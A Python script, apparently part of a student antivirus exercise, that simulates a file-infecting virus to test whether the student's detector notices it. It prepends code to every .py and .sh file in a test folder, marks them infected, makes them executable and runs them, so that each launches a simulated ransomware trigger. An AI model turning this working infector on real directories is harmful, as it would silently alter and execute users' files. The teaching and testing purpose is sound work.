import os
import subprocess
import time
import sys
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))

from modules.utils import log_summary
from modules.constants import DETECTION_FILE


INFECTION_MARKER = "#infected"
TRIGGER_SCRIPT_PATH = os.path.abspath(
    os.path.join(os.path.dirname(__file__), "simulation", "trigger_ransom.py")
)
INJECTION_CODE = (
    f"{INFECTION_MARKER}\n"
    "import os\n"
    f"os.system('python3 {TRIGGER_SCRIPT_PATH}')\n"
)

TARGET_DIR = os.path.abspath(
    os.path.join(os.path.dirname(__file__), "..", "..", "tmp", "TestInfected")
)
TARGET_EXTENSIONS = ['.py', '.sh']


def is_infected(content):
    return INFECTION_MARKER in content

def clear_detection_log():
    try:
        open(DETECTION_FILE, "w").close()
    except:
        pass

def was_detected():
    try:
        with open(DETECTION_FILE) as f:
            return bool(f.read().strip())
    except:
        return False

def infect_file(filepath):
    try:
        with open(filepath, 'r') as f:
            content = f.read()

        if is_infected(content):
            return

        if filepath.endswith('.sh') and not content.startswith("#!"):
            content = "#!/bin/bash\n" + content

        with open(filepath, 'w') as f:
            f.write(INJECTION_CODE + content)

        os.chmod(filepath, 0o755)

        print(f"[+] Infected & executing: {filepath}")

        if filepath.endswith('.py'):
            subprocess.run(['python3', filepath])
        elif filepath.endswith('.sh'):
            subprocess.run([filepath])

    except Exception as e:
        print(f"[-] Failed: {filepath}: {e}")

def scan_and_infect(directory):
    for root, _, files in os.walk(directory):
        for filename in files:
            if any(filename.endswith(ext) for ext in TARGET_EXTENSIONS):
                filepath = os.path.join(root, filename)
                infect_file(filepath)

def run_student_antivirus():
    path = os.path.abspath(
        os.path.join(os.path.dirname(__file__), "..", "..", "tmp", "student_antivirus.py")
    )
    subprocess.run(["python3", path])

if __name__ == "__main__":
    log_summary("סימולציית הדבקה הופעלה", "system")

    print("[*] שלב 1: ניקוי קובץ זיהוי")
    clear_detection_log()

    print("[*] שלב 2: הרצת אנטי וירוס של התלמיד")
    run_student_antivirus()
    time.sleep(1)

    print("[*] שלב 3: הדבקה והרצה בפועל")
    scan_and_infect(TARGET_DIR)
    time.sleep(1)

    print("[*] שלב 4: בדיקת זיהוי")
    if was_detected():
        log_summary("זוהה תהליך הדבקה trigger_ransom.py", "success")
    else:
        log_summary("לא זוהתה הדבקה בזמן", "fail")
